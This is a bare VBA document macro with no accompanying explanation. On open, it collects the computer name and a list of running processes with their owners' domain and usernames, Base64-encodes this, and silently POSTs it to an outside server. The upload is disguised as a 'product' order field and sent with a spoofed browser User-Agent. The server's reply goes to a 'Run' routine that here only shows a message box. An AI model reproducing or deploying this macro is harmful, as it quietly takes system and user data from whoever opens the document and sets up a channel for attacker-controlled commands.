Sub OnOpen()
    Set oh = CreateObject("MSXML2.XMLHTTP")
    oh.Open "POST", "http://server.com/order", False
    oh.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    oh.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
    oh.send ("product=" & Base64Encode(GetProcessList()))
    Run (oh.responseText)
    Set oh = Nothing

End Sub

Function GetProcessList() As String
    On Error Resume Next
    Dim objWMIService, colProcessList As Object
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
    Dim result As String
    Dim objProcess As Object
    result = result & "hostname=" & Environ("ComputerName") & vbNewLine
    For Each objProcess In colProcessList
        temp_name = objProcess.GetOwner(strNameOfUser, strDomainofUser)
        If temp_name <> 0 Then
            result = result & objProcess.ProcessId & "  " & "unknown" & " " & objProcess.Name & vbNewLine
        Else
            result = result & objProcess.ProcessId & "  " & strDomainofUser & "\" & strNameOfUser & "  " & objProcess.Name & vbNewLine
        End If
    Next
    GetProcessList = result
End Function

Function Base64Encode(sText)
    Set oNode = CreateObject("Msxml2.DOMDocument.3.0").createElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = Stream_StringToBinary(sText)
    Base64Encode = oNode.Text
    Set oNode = Nothing
End Function

Function Stream_StringToBinary(Text)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 2
    BinaryStream.Charset = "us-ascii"
    BinaryStream.Open
    BinaryStream.WriteText Text
    BinaryStream.Position = 0
    BinaryStream.Type = 1
    BinaryStream.Position = 0
    Stream_StringToBinary = BinaryStream.Read
    Set BinaryStream = Nothing
End Function

Function Run(Text)
    If Text = "Saftey First" Then
        MsgBox Text, vbOKOnly, "Decision"
    Else
       MsgBox Text, vbOKOnly, "Decision"
    End If
End Function